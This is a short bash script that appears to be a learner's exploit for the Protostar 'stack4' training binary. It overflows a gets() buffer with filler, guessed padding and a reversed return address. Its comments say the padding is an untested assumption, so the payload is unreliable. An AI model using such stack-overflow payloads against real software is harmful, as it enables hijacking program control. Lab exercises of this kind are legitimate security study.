#!/bin/bash
##
# overflow buffer when gets(3) is called.
# buffer is 64 bytes "*"
# overflows into stack setup and tear down features
# 
# INPUT entered via stdin
## 
BUFFER="0000000000000000000000000000000000000000000000000000000000000000"
# THIS IS A ASSUMPTION!
# argc = 4 byte integer
# argv = 8 byte address
# i am not too sure how to prove this in GDB yet
PADDING="000100000002"
# address taken from `nm /opt/protostar/bin/stack4`
# reversed due to endianness
OVERFLOW=$(echo -n "0xf4830408" | xxd -r)
INPUT=${BUFFER}${PADDING}${OVERFLOW}
echo -e -n ${INPUT} > stack4
echo -e -n "${INPUT}" | /opt/protostar/bin/stack4
